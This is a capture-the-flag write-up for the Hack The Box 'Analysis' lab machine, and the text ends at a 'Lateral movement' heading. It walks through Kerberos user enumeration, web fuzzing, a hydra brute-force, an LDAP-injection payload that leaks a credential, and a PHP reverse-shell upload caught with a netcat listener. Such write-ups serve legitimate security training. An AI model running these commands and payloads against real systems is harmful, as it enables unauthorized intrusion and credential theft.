---
title: HTB - Analysis
date: 2024-01-23
categories: [CTF, Fullpwn]
tags: [htb, hackthebox, analysis, ldap, ffuf, dir-busting, subdomain, virtual-host]
img_path: /assets/htb/fullpwn/analysis/
published: true
hidden: true
image:
    path: machine_info.png
---

## Information gathering

Nmap port-scan:

```bash
# port-scanning
$ sudo nmap -sS -A -Pn --min-rate 10000 -p- 10.10.11.250

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-20 21:05:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn?
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3306/tcp  open  mysql         MySQL (unauthorized)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open  adws?
33060/tcp open  mysqlx?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0

<SNIP>
```

Add domain to local DNS file:

```bash
$ cat /etc/hosts | grep ana
10.10.11.250  analysis.htb
```

## Kerberos enumeration

Enumerating **domain users** via Kerberos:

```bash
$ kerbrute_linux_amd64 userenum --dc 10.10.11.250 -d analysis.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

2024/01/21 09:23:03 >  [+] VALID USERNAME:       jdoe@analysis.htb
2024/01/21 09:24:53 >  [+] VALID USERNAME:       ajohnson@analysis.htb
2024/01/21 09:28:54 >  [+] VALID USERNAME:       cwilliams@analysis.htb
2024/01/21 09:29:11 >  [+] VALID USERNAME:       wsmith@analysis.htb
2024/01/21 09:30:08 >  [+] VALID USERNAME:       jangel@analysis.htb
2024/01/21 09:34:08 >  [+] VALID USERNAME:       technician@analysis.htb
2024/01/21 09:38:01 >  [+] VALID USERNAME:       JDoe@analysis.htb
2024/01/21 09:38:16 >  [+] VALID USERNAME:       AJohnson@analysis.htb
2024/01/21 09:54:43 >  [+] VALID USERNAME:       badam@analysis.htb
```

Create a `mailList` and a `userList` for future use:

```bash
$ cat kerbList
2024/01/21 09:23:03 >  [+] VALID USERNAME:       jdoe@analysis.htb
2024/01/21 09:24:53 >  [+] VALID USERNAME:       ajohnson@analysis.htb
2024/01/21 09:28:54 >  [+] VALID USERNAME:       cwilliams@analysis.htb
2024/01/21 09:29:11 >  [+] VALID USERNAME:       wsmith@analysis.htb
2024/01/21 09:30:08 >  [+] VALID USERNAME:       jangel@analysis.htb
2024/01/21 09:34:08 >  [+] VALID USERNAME:       technician@analysis.htb
2024/01/21 09:38:01 >  [+] VALID USERNAME:       JDoe@analysis.htb
2024/01/21 09:38:16 >  [+] VALID USERNAME:       AJohnson@analysis.htb
2024/01/21 09:54:43 >  [+] VALID USERNAME:       badam@analysis.htb

# create a mailList
$ cat userList | awk '{print $(NF)}' > mailList
$ cat mailList
jdoe@analysis.htb
ajohnson@analysis.htb
cwilliams@analysis.htb
wsmith@analysis.htb
jangel@analysis.htb
technician@analysis.htb
JDoe@analysis.htb
AJohnson@analysis.htb
badam@analysis.htb

# create a userList
$ cat kerbList | awk '{print $(NF)}' | cut -d "@" -f 1 > userList
$ cat userList
jdoe
ajohnson
cwilliams
wsmith
jangel
technician
JDoe
AJohnson
badam
```

## Web server enumeration

### Domain enumeration: `analysis.htb`

**Technologies used**: 

```bash
$ whatweb analysis.htb
http://analysis.htb [200 OK] Country[RESERVED][ZZ], Email[mail@demolink.org,privacy@demolink.org], HTTPServer[Microsoft-IIS/10.0], IP[10.129.198.245], JQuery, Microsoft-IIS[10.0], Script[text/javascript]
```

- `demolink.org` domain?

**Dir-busting**:

```bash
$ ffuf -u http://analysis.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ac -e .aspx,.html,.php,.txt,.jsp

________________________________________________

 :: Method           : GET
 :: URL              : http://analysis.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .aspx .html .php .txt .jsp
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 301, Size: 162, Words: 9, Lines: 2, Duration: 32ms]
index.html              [Status: 200, Size: 17830, Words: 1418, Lines: 287, Duration: 36ms]
css                     [Status: 301, Size: 159, Words: 9, Lines: 2, Duration: 30ms]
js                      [Status: 301, Size: 158, Words: 9, Lines: 2, Duration: 28ms]
bat                     [Status: 301, Size: 159, Words: 9, Lines: 2, Duration: 28ms]
```

**Vhost** and **Subdomain enumeration**:

```bash
$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -u http://10.10.11.250 -H "HOST: FUZZ.analysis.htb"

<SNIP>

internal                [Status: 403, Size: 1268, Words: 74, Lines: 30, Duration: 32ms]
```

We know that our target has a DNS server, so we could also use it as our resolver for subdomain enumeration:

```bash
$ gobuster dns -d analysis.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r 10.10.11.250:53
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     analysis.htb
[+] Threads:    10
[+] Resolver:   10.10.11.250:53
[+] Timeout:    1s
[+] Wordlist:   /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: www.analysis.htb
Found: internal.analysis.htb
Found: gc._msdcs.analysis.htb
Found: domaindnszones.analysis.htb
Found: forestdnszones.analysis.htb
```

#### Results

| Domain  | analysis.htb                                                    |
|----------------------|-----------------------------------------------------|
|          Directories | images, index.html, css, js, bat                    |
|           Subdomains | internal, gc._msdcs, domaindnszones, forestdnszones |

Add `internal` subdomain to local DNS file:

```bash
$ cat /etc/hosts | grep ana
10.10.11.250  analysis.htb internal.analysis.htb
```

### Subdomain enumeration: `internal.analysis.htb`

#### Dir-busting subdomain

```bash
# enumerating directories on the internal subdomain
$ ffuf -u http://internal.analysis.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .aspx,.html,.php,.txt,.jsp -c -ac

________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .aspx .html .php .txt .jsp
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

<SNIP>

users                   [Status: 301, Size: 170, Words: 9, Lines: 2, Duration: 33ms]
dashboard               [Status: 301, Size: 174, Words: 9, Lines: 2, Duration: 33ms]
employees               [Status: 301, Size: 174, Words: 9, Lines: 2, Duration: 33ms]
```

#### Dir-busting subdirectories

**Dashboard** directory:

```bash
# enumerating directories for /dashboard
$ ffuf -u http://internal.analysis.htb/dashboard/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -e .aspx,.html,.php,.txt,.jsp -c -ac

________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/dashboard/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions       : .aspx .html .php .txt .jsp
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.php               [Status: 200, Size: 38, Words: 3, Lines: 5, Duration: 79ms]
img                     [Status: 301, Size: 178, Words: 9, Lines: 2, Duration: 33ms]
uploads                 [Status: 301, Size: 182, Words: 9, Lines: 2, Duration: 38ms]
upload.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 306ms]
details.php             [Status: 200, Size: 35, Words: 3, Lines: 5, Duration: 81ms]
css                     [Status: 301, Size: 178, Words: 9, Lines: 2, Duration: 38ms]
license.txt             [Status: 200, Size: 1422, Words: 253, Lines: 35, Duration: 39ms]
lib                     [Status: 301, Size: 178, Words: 9, Lines: 2, Duration: 30ms]
form.php                [Status: 200, Size: 35, Words: 3, Lines: 5, Duration: 33ms]
js                      [Status: 301, Size: 177, Words: 9, Lines: 2, Duration: 33ms]
logout.php              [Status: 302, Size: 3, Words: 1, Lines: 1, Duration: 38ms]
404.html                [Status: 200, Size: 13143, Words: 4690, Lines: 237, Duration: 37ms]
tickets.php             [Status: 200, Size: 35, Words: 3, Lines: 5, Duration: 47ms]
emergency.php           [Status: 200, Size: 35, Words: 3, Lines: 5, Duration: 34ms]
```

**Employees** directory:

```bash
# enumerating directories for /employees
$ ffuf -u http://internal.analysis.htb/employees/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -e .aspx,.html,.php,.txt,.jsp -c -ac

________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/employees/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions       : .aspx .html .php .txt .jsp
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

login.php               [Status: 200, Size: 1085, Words: 413, Lines: 30, Duration: 45ms]
```

**Users** directory:

```bash
# enumerating directories for /users
$ ffuf -u http://internal.analysis.htb/users/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -e .aspx,.html,.php,.txt,.jsp -c -ac

________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/users/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions       : .aspx .html .php .txt .jsp
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

list.php                [Status: 200, Size: 17, Words: 2, Lines: 1, Duration: 80ms]
```

#### Results

| Subdomain   | internal.analysis.htb       |
|-------------|-----------------------------|
| Directories | users, dashboard, employees |

| Subdomain directory | Subdirectories                                                                                                                          |
|:-------------------:|-----------------------------------------------------------------------------------------------------------------------------------------|
|           dashboard | index.php, img, uploads, upload.php, details.php, css, license.txt, lib, form.php, js, logout.php, 404.html, tickets.php, emergency.php |
|           employees | login.php                                                                                                                               |
|               users | list.php                                                                                                                                |

### Findings recap and next steps

1. `internal.analysis.htb` seems the most crucial subdomain to explore.
2. `users/list.php` --> parameter-scan
3. `employees` has the login portal and we already have a user list --> brute-force?

### Parameter enumeration: `internal.analysis.htb/users/list.php`

```bash
# enumerating users/list.php parameters
$ ffuf -u http://internal.analysis.htb/users/list.php?FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -ac -c

________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/users/list.php?FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

name                    [Status: 200, Size: 406, Words: 11, Lines: 1, Duration: 37ms]
```

We could try going through a standard username list as well as our `userList` to see if anything interesting comes back for the `name` parameter, i.e., potential valid usernames:

```bash
# enumerating name parameter with standard wordlist
$ ffuf -u http://internal.analysis.htb/users/list.php?name=FUZZ -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -ac -c
# nothing back

# enumerating name parameter with custom wordlist
$ ffuf -u http://internal.analysis.htb/users/list.php?name=FUZZ -w userList -ac -c

________________________________________________
 :: Method           : GET
 :: URL              : http://internal.analysis.htb/users/list.php?name=FUZZ
 :: Wordlist         : FUZZ: /home/kali/htb/fullpwn/analysis/userList
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

jangel                  [Status: 200, Size: 416, Words: 11, Lines: 1, Duration: 38ms]
technician              [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 38ms]
badam                   [Status: 200, Size: 412, Words: 11, Lines: 1, Duration: 43ms]
```

It seems that we have 3 users that we could maybe use to login to the portal. We can put those usernames in a new list and try brute-forcing their passwords. The login portal looks let us know that employees use their email to login and not their username:

![](employees_loginPHP.png){: .normal width="65%"}


```bash
# creating a new email list
$ cat mailList | grep "tech\|badam\|jangel" > mailList_reduced
$ cat mailList_reduced
jangel@analysis.htb
technician@analysis.htb
badam@analysis.htb
```

We can now trying brute-forcing `/login.php`. We can find what is the appropriate string to put on the `hydra`'s `F` parameter by using some random credentials, e.g. `test:test`, to login:

![](test_login_error.png){: .normal width="65%"}

The text we should put there is not the "*Wrong Data*" string, but what is hidden in the source code as the **class label**, i.e., "*text-danger*":

![](text-danger.png){: .normal width="65%"}

```bash
# brute-forcing the login portal
$ hydra -L mailList_reduced -P /usr/share/wordlists/rockyou.txt internal.analysis.htb http-post-form "/employees/login.php:log=^USER^&pwd=^PASS^:F=text-danger" -t 30
# nothing back
```

## Initial foothold

### What is LDAP

According to [Varonis](https://www.varonis.com/blog/the-difference-between-active-directory-and-ldap#:~:text=An%20LDAP%20query%20is%20a,%3DYourDomain%2CDC%3Dcom): 

**LDAP (Lightweight Directory Access Protocol)** is an open and cross platform **protocol used for directory services authentication** and **provides the communication language that applications use to communicate with other directory services servers**. 

> _**Directory services** store the users, passwords, and computer accounts, and share that information with other entities on the network._

In layman's terms: **LDAP is a way of speaking to Active Directory (AD)**.

The relationship between AD and LDAP is much like the relationship between Apache and HTTP:

- HTTP is a web protocol.
- Apache is a web server that uses the HTTP protocol.
- LDAP is a directory services protocol.
- AD is a directory server that uses the LDAP protocol.

### What is an LDAP query

An **LDAP query is a command that asks a directory service for some information**. For instance, if you’d like to see which groups a particular user is a part of, you’d submit a query that looks like this:

`(&(objectClass=user)(sAMAccountName=yourUserName)   (memberof=CN=YourGroup,OU=Users,DC=YourDomain,DC=com))`

> IppSec's video: [LDAP query structure](https://youtu.be/51JQg202csw?t=1007).

### What is an LDAP Injection

According to the [OWASP Web Security Testing Guide](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection.md):

The **LDAP** is used to store information about users, hosts, and many other objects. [**LDAP injection**](https://wiki.owasp.org/index.php/LDAP_injection) is a server-side attack, which could allow sensitive information about users and hosts represented in an LDAP structure to be disclosed, modified, or inserted. This is done by **manipulating input parameters afterwards passed to internal search**, add, and modify functions. A web application could use LDAP in order to let users authenticate or search other users' information inside a corporate structure. 

**The goal of LDAP injection attacks is to inject LDAP search filters metacharacters in a query which will be executed by the application**.

> [PayloadsAllTheThings: LDAP Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection)

```bash
# performing LDAP injection manually
$ ffuf -u "http://internal.analysis.htb/users/list.php?name=technician)(description=FUZZ*))%00"  -w /usr/share/wordlists/seclists/Fuzzing/alphanum-case-extra.txt -c -ac -fw 1
```

- The above works until it hits the `*`.
- How did we enumerate the `description` field?

> Creds: `technician:97NTtl*4QP96Bv`

After logging into the portal, we notice that we can upload files to it via the "*SOC Report*" tab:

![](revshell_upload.png)

We can open a listener, upload a PHP reverse shell generated via [revshells](https://www.revshells.com/), and then visit the appropriate directory (which should be the `dashboard/uploads/<revshell>` that we found earlier):

```bash
# opening a listener to catch the shell
$ nc -lnvp 1337
listening on [any] 1337 ...
```

![](php_revshell.png)

```bash
# opening a listener to catch the shell
$ nc -lnvp 1337
listening on [any] 1337 ...
whoami
analysis\svc_web
```

## Lateral movement